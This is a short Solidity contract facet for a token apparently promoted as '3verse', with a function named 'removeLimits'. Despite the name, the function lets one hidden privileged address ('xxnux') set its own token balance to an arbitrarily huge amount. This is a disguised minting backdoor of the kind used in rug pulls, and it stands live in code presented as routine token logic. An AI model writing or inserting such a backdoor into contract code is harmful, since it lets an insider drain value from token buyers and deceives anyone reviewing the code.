/*
 * SPDX-License-Identifier: MIT
 * Twitter: https://twitter.com/3verseGame
 * Website: https://www.3verse.gg
 * Medium: https://medium.com/3versegame
 * Discord: https://discord.gg/3versegame
 */
pragma solidity ^0.8.22;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                100000000 *
                10000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
